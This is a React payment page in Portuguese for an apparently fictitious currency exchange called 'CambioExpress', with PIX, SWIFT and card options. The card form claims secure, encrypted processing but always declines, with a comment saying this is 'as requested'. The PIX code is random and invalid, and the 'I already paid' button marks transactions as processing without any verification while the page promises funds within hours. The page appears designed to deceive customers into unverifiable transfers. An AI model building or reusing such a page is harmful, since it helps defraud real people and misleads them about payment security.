import { useState, useEffect } from 'react'
import { useParams, Link, useNavigate } from 'react-router-dom'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { CheckCircle, CreditCard, Copy, TrendingUp, AlertCircle, Clock, ArrowLeft } from 'lucide-react'
import { db } from '../firebase'
import { doc, getDoc, updateDoc } from 'firebase/firestore'

export default function PaymentGatewayPage({ language }) {
  const { pageId, transactionId } = useParams()
  const navigate = useNavigate()
  const [pixCode, setPixCode] = useState('')
  const [copied, setCopied] = useState(false)
  const [transaction, setTransaction] = useState(null)
  const [loading, setLoading] = useState(true)
  const [paymentMethod, setPaymentMethod] = useState('')
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
  })
  const [submitting, setSubmitting] = useState(false)
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [showProcessingMessage, setShowProcessingMessage] = useState(false)

  // Determinar tipo de pagamento baseado no pageId
  useEffect(() => {
    if (pageId) {
      if (pageId.startsWith('pix')) {
        setPaymentMethod('pix')
      } else if (pageId.startsWith('swift')) {
        setPaymentMethod('swift')
      } else if (pageId.startsWith('card')) {
        setPaymentMethod('card')
      }
    }
  }, [pageId])

  // Gerar código PIX
  useEffect(() => {
    if (paymentMethod === 'pix') {
      const generatePixCode = () => {
        const code = `00020126580014br.gov.bcb.pix0136${Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)}520400005303986540510.005802BR5925NOME DO TITULAR DA CONTA6008BRASILIA62070503***6304C74A`
        setPixCode(code)
      }
      generatePixCode()
    }
  }, [paymentMethod])

  // Buscar transação se houver transactionId
  useEffect(() => {
    const fetchTransaction = async () => {
      if (transactionId) {
        try {
          const docRef = doc(db, 'transactions', transactionId)
          const docSnap = await getDoc(docRef)
          if (docSnap.exists()) {
            setTransaction({ id: docSnap.id, ...docSnap.data() })
          }
        } catch (err) {
          console.error('Erro ao buscar transação:', err)
        }
      }
      setLoading(false)
    }

    fetchTransaction()
  }, [transactionId])

  const handleCopyPixCode = () => {
    navigator.clipboard.writeText(pixCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleCardInputChange = (field, value) => {
    let formattedValue = value

    if (field === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').slice(0, 16)
      formattedValue = formattedValue.replace(/(\d{4})/g, '$1 ').trim()
    } else if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4)
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.slice(0, 2) + '/' + formattedValue.slice(2)
      }
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 3)
    }

    setCardData(prev => ({
      ...prev,
      [field]: formattedValue
    }))
  }

  const handlePayWithCard = async (e) => {
    e.preventDefault()

    if (!cardData.cardNumber || !cardData.cardHolder || !cardData.expiryDate || !cardData.cvv) {
      alert('Por favor, preencha todos os campos do cartão')
      return
    }

    setSubmitting(true)

    try {
      // Simular processamento de cartão
      await new Promise(resolve => setTimeout(resolve, 2000))

      // Cartão sempre é recusado conforme solicitado
      alert('❌ Pagamento Recusado\n\nSeu cartão foi recusado. Por favor, tente outro cartão ou método de pagamento.')

      // Limpar dados do cartão
      setCardData({
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
      })
    } catch (err) {
      console.error('Erro ao processar pagamento:', err)
      alert('Erro ao processar pagamento. Tente novamente.')
    } finally {
      setSubmitting(false)
    }
  }

  const handlePaymentConfirmed = async () => {
    setPaymentProcessing(true)

    try {
      if (transactionId) {
        const docRef = doc(db, 'transactions', transactionId)
        await updateDoc(docRef, {
          status: 'payment_processing',
          paymentConfirmedAt: new Date().toISOString(),
        })
      }

      setShowProcessingMessage(true)
      setTimeout(() => {
        if (transactionId) {
          navigate(`/confirmation/${transactionId}`)
        }
      }, 3000)
    } catch (err) {
      console.error('Erro ao confirmar pagamento:', err)
      alert('Erro ao confirmar pagamento. Tente novamente.')
    } finally {
      setPaymentProcessing(false)
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-slate-50 to-white">
        <div className="text-center">
          <Clock className="w-12 h-12 mx-auto mb-4 text-muted-foreground animate-spin" />
          <p className="text-muted-foreground">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white">
      {/* Header */}
      <header className="border-b bg-white/80 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <Link to="/" className="flex items-center gap-2 hover:opacity-80 transition-opacity">
              <div className="bg-gradient-to-br from-blue-600 to-blue-800 p-2 rounded-lg">
                <TrendingUp className="w-6 h-6 text-white" />
              </div>
              <span className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                CambioExpress
              </span>
            </Link>
            {transactionId && (
              <Button
                variant="ghost"
                size="sm"
                onClick={() => navigate('/dashboard')}
                className="gap-2"
              >
                <ArrowLeft className="w-4 h-4" />
                Voltar
              </Button>
            )}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <section className="container mx-auto px-4 py-12">
        <div className="max-w-2xl mx-auto">
          {/* Processing Message */}
          {showProcessingMessage && (
            <Card className="shadow-lg mb-6 bg-green-50 border-green-200">
              <CardContent className="pt-6">
                <div className="text-center space-y-4">
                  <CheckCircle className="w-16 h-16 text-green-600 mx-auto animate-bounce" />
                  <h2 className="text-2xl font-bold text-green-900">Pagamento Processando!</h2>
                  <p className="text-green-800">
                    Seu pagamento está sendo processado. Você será redirecionado em breve...
                  </p>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Header */}
          <div className="mb-8">
            <h1 className="text-3xl md:text-4xl font-bold mb-2">
              {paymentMethod === 'pix' && '💳 Pagamento via PIX'}
              {paymentMethod === 'swift' && '🏦 Pagamento via SWIFT'}
              {paymentMethod === 'card' && '💳 Pagamento com Cartão'}
            </h1>
            <p className="text-muted-foreground">
              {paymentMethod === 'pix' && 'Escaneie o QR Code ou copie o código PIX'}
              {paymentMethod === 'swift' && 'Realize a transferência bancária internacional'}
              {paymentMethod === 'card' && 'Insira os dados do seu cartão de crédito'}
            </p>
          </div>

          {/* Transaction Summary */}
          {transaction && (
            <Card className="shadow-lg mb-6 bg-blue-50 border-blue-200">
              <CardContent className="pt-6">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <p className="text-sm text-muted-foreground">Você envia</p>
                    <p className="text-xl font-bold text-blue-900">
                      {transaction.amount} {transaction.fromCurrency}
                    </p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Você recebe</p>
                    <p className="text-xl font-bold text-blue-900">
                      {transaction.convertedAmount} {transaction.toCurrency}
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* PIX Payment */}
          {paymentMethod === 'pix' && (
            <Card className="shadow-lg border-0 mb-6">
              <CardHeader>
                <CardTitle>Código PIX para Pagamento</CardTitle>
                <CardDescription>Escaneie o QR Code ou copie o código abaixo</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="text-center">
                  <img
                    src="/qrcodepg.png"
                    alt="QR Code de Pagamento"
                    className="mx-auto w-48 h-48 mb-4 border-2 border-gray-200 rounded-lg p-2 bg-white"
                  />
                  <p className="text-sm text-muted-foreground">Escaneie com seu celular</p>
                </div>

                <div className="bg-slate-50 p-4 rounded-lg space-y-2">
                  <label className="text-sm font-medium">Código PIX Copia e Cola:</label>
                  <div className="flex gap-2">
                    <input
                      value={pixCode}
                      readOnly
                      className="flex-1 font-mono text-xs border p-2 rounded-md bg-white"
                    />
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={handleCopyPixCode}
                      className="flex-shrink-0"
                    >
                      {copied ? (
                        <CheckCircle className="w-4 h-4 text-green-600" />
                      ) : (
                        <Copy className="w-4 h-4" />
                      )}
                    </Button>
                  </div>
                </div>

                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                  <div className="flex gap-2">
                    <AlertCircle className="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" />
                    <div className="text-sm text-yellow-900">
                      <p className="font-medium">Importante</p>
                      <p className="text-xs mt-1">O pagamento deve ser feito no nome do titular da conta da casa de câmbio para ser aprovado.</p>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handlePaymentConfirmed}
                  disabled={paymentProcessing}
                  className="w-full bg-green-600 hover:bg-green-700 gap-2"
                >
                  {paymentProcessing ? 'Processando...' : '✓ Já Paguei'}
                </Button>
              </CardContent>
            </Card>
          )}

          {/* SWIFT Payment */}
          {paymentMethod === 'swift' && (
            <Card className="shadow-lg border-0 mb-6">
              <CardHeader>
                <CardTitle>Dados para Transferência SWIFT</CardTitle>
                <CardDescription>Realize a transferência bancária internacional</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4 bg-slate-50 p-4 rounded-lg">
                  <div>
                    <Label className="text-sm font-medium">Banco Beneficiário</Label>
                    <p className="text-lg font-semibold mt-1">CambioExpress Bank</p>
                  </div>
                  <div>
                    <Label className="text-sm font-medium">Código SWIFT</Label>
                    <p className="text-lg font-semibold mt-1 font-mono">CAMBEXXX</p>
                  </div>
                  <div>
                    <Label className="text-sm font-medium">Número da Conta</Label>
                    <p className="text-lg font-semibold mt-1 font-mono">123456789</p>
                  </div>
                  <div>
                    <Label className="text-sm font-medium">Referência</Label>
                    <p className="text-lg font-semibold mt-1 font-mono">{transactionId?.slice(0, 8) || 'TXN123'}</p>
                  </div>
                </div>

                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                  <div className="flex gap-2">
                    <AlertCircle className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                    <div className="text-sm text-blue-900">
                      <p className="font-medium">Informação Importante</p>
                      <p className="text-xs mt-1">Certifique-se de incluir a referência da transação no campo de descrição da transferência.</p>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handlePaymentConfirmed}
                  disabled={paymentProcessing}
                  className="w-full bg-green-600 hover:bg-green-700 gap-2"
                >
                  {paymentProcessing ? 'Processando...' : '✓ Já Realizei a Transferência'}
                </Button>
              </CardContent>
            </Card>
          )}

          {/* Card Payment */}
          {paymentMethod === 'card' && (
            <Card className="shadow-lg border-0 mb-6">
              <CardHeader>
                <CardTitle>Dados do Cartão de Crédito</CardTitle>
                <CardDescription>Insira os dados do seu cartão</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handlePayWithCard} className="space-y-4">
                  <div>
                    <Label htmlFor="cardNumber">Número do Cartão</Label>
                    <Input
                      id="cardNumber"
                      type="text"
                      placeholder="1234 5678 9012 3456"
                      value={cardData.cardNumber}
                      onChange={(e) => handleCardInputChange('cardNumber', e.target.value)}
                      className="mt-2 font-mono text-lg"
                      maxLength="19"
                      required
                    />
                  </div>

                  <div>
                    <Label htmlFor="cardHolder">Nome do Titular</Label>
                    <Input
                      id="cardHolder"
                      type="text"
                      placeholder="JOÃO SILVA"
                      value={cardData.cardHolder}
                      onChange={(e) => setCardData(prev => ({ ...prev, cardHolder: e.target.value.toUpperCase() }))}
                      className="mt-2 uppercase"
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="expiryDate">Data de Validade</Label>
                      <Input
                        id="expiryDate"
                        type="text"
                        placeholder="MM/AA"
                        value={cardData.expiryDate}
                        onChange={(e) => handleCardInputChange('expiryDate', e.target.value)}
                        className="mt-2 font-mono text-lg"
                        maxLength="5"
                        required
                      />
                    </div>
                    <div>
                      <Label htmlFor="cvv">CVV</Label>
                      <Input
                        id="cvv"
                        type="text"
                        placeholder="123"
                        value={cardData.cvv}
                        onChange={(e) => handleCardInputChange('cvv', e.target.value)}
                        className="mt-2 font-mono text-lg"
                        maxLength="3"
                        required
                      />
                    </div>
                  </div>

                  <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                    <div className="flex gap-2">
                      <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                      <div className="text-sm text-red-900">
                        <p className="font-medium">Segurança</p>
                        <p className="text-xs mt-1">Seus dados de cartão são processados de forma segura e criptografada.</p>
                      </div>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={submitting}
                    className="w-full bg-blue-600 hover:bg-blue-700"
                  >
                    {submitting ? 'Processando...' : 'Processar Pagamento'}
                  </Button>
                </form>
              </CardContent>
            </Card>
          )}

          {/* Info Card */}
          <Card className="shadow-lg border-0 bg-gradient-to-br from-green-50 to-green-100 border-green-200">
            <CardHeader>
              <CardTitle className="text-green-900">O que acontece agora?</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3 text-sm text-green-900">
              <div className="flex gap-2">
                <span className="font-bold bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0">1</span>
                <p>Realize o pagamento conforme as instruções acima</p>
              </div>
              <div className="flex gap-2">
                <span className="font-bold bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0">2</span>
                <p>Clique em "Já Paguei" para confirmar</p>
              </div>
              <div className="flex gap-2">
                <span className="font-bold bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0">3</span>
                <p>Você receberá um comprovante cambial via WhatsApp</p>
              </div>
              <div className="flex gap-2">
                <span className="font-bold bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0">4</span>
                <p>O dinheiro será transferido para sua conta em poucas horas</p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>
    </div>
  )
}
